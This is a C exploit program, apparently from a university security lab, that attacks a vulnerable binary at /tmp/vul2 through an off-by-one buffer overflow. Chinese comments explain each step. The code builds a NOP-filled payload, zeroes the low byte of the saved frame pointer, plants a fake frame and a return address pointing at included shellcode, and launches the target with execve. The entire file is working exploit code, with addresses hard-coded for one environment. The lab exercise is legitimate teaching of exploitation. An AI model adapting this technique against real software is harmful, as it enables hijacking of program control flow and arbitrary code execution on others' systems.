#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode/shellcode.h"

#define TARGET "/tmp/vul2"

int main(void)
{
    //因为可以溢出的大小只有一个字节，所以payload的大小为201
    char payload[201];
    //将payload其余位置赋值为nop指令
    memset(payload, 0x90, sizeof(payload));
    //将foo函数的ebp的最后一个字节覆盖为0
    payload[200] = 0;
    //覆盖过后的ebp
    unsigned int new_ebp = 0xffffdd00;
    //buf的起始地址
    unsigned int buf_addr = 0xffffdcb8;
    //计算两个变量的相对偏移
    unsigned int offset = new_ebp - buf_addr;
    //执行pop ebp指令时弹出给foo函数的ebp的值，这里不会影响实验结果
    //只是占据4个字节即可,在这里我们将其设定为其原本的值
    unsigned int foo_ebp = 0xffffdd8c;
    //shellcode起始地址
    unsigned int shellcode_start = new_ebp + 8;//ffffdd08
    memcpy(payload + offset, &foo_ebp, 4);//ffffdd00
    memcpy(payload + offset + 4, &shellcode_start, 4);//ffffdd04
    memcpy(payload + offset + 8, shellcode, strlen(shellcode));

    char *args[] = {TARGET, payload, NULL};
    char *env[] = {NULL};

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}
